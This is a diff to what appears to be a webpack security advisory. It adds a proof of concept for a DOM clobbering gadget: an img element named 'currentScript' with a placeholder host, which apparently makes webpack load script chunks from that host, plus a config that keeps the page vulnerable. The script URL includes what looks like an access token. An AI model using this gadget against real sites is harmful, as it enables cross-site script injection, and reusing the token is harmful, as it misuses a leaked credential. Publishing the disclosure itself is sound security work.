@@ -110,4 +110,34 @@ __webpack_require__.l = (url, done, key, chunkId) => {
 
 ## PoC
 
+```
+<html>
+<head>
+    <title>Webpack Gadgets</title>
+</head>
+<body>
+<img name="currentScript" src="https://xxx.xxxx.xxx"></img>
+
+
+<script src="https://raw.githubusercontent.com/jackfromeast/dom-clobbering-collection/main/domc-gadgets-assets/webpack/dist/webpack-gadgets.bundle.js?token=GHSAT0AAAAAACHOWGIH7SZYJ4GGACO6R4ZOZVDEPLQ"></script>
+</body>
+</html>
+```
+
+The `webpack.config.js` to generate the bundle can be found below. Note that, to avoid `__webpack_require__.p` being set as a fixed value, the config shouldn't set the `output.publicPath` field to a fix string.
+
+```
+module.exports = {
+  entry: './entry.js', // Ensure the correct path to your entry file
+  output: {
+    filename: 'webpack-gadgets.bundle.js', // Output bundle file
+    path: path.resolve(__dirname, 'dist'), // Output directory
+    // publicPath: '/dist/', // this line will make __webpack_require__.p = "/dist/";
+  },
+  target: 'web',
+  mode: 'development',
+};
+```
+
 Webpack's generated code differes significantly for each use. Ensure that the code snippets appear, then browse the network requests to see the URLs that are requested. Some users may configure their public path differently. Fingerprint may not work if Webpack is configured to not produce source maps.
+
